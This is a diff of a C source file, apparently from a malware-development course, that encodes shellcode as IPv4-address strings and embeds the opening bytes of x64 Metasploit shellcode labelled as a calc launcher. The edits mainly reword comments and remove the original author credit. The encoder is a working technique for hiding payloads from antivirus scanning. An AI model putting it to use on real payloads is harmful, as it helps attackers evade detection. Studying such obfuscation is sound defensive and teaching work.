@@ -1,16 +1,15 @@
-// @NUL0x4C | @mrd0x : MalDevAcademy
 
 #include <Windows.h>
 #include <stdio.h>
 
-// Disable error 4996 (caused by sprint)
+// Disable error caused by sprintf
 #pragma warning (disable:4996)
 
 
 char* GenerateIpv4(int a, int b, int c, int d) {
 	unsigned char Output [32];
 
-	// Creating the IPv4 address and saving it to the 'Output' variable 
+	//Generate the ip to match the correct format of an ipv4
 	sprintf(Output, "%d.%d.%d.%d", a, b, c, d);
 
 	// Optional: Print the 'Output' variable to the console
@@ -21,7 +20,6 @@ char* GenerateIpv4(int a, int b, int c, int d) {
 
 
 // Generate the IPv4 output representation of the shellcode
-// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
 BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
 
 	// If the shellcode buffer is null or the size is not a multiple of 4, exit
@@ -41,7 +39,7 @@ BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
 		if (c == 4) {
 			counter++;
 
-			// Generating the IPv4 address from 4 bytes which begin at i until [i + 3] 
+			// Generating the IPv4 address from 4 bytes
 			IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);
 
 			if (i == ShellcodeSize - 4) {
@@ -50,13 +48,13 @@ BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
 				break;
 			}
 			else {
-				// Printing the IPv4 address
+		
 				printf("\"%s\", ", IP);
 			}
 
 			c = 1;
 
-			// Optional: To beautify the output on the console
+			//To organize the output on the console
 			if (counter % 8 == 0) {
 				printf("\n\t");
 			}
@@ -70,7 +68,7 @@ BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
 }
 
 
-// x64 calc metasploit shellcode {272 bytes}
+// x64 calc metasploit shellcode 
 unsigned char rawData[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
 	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
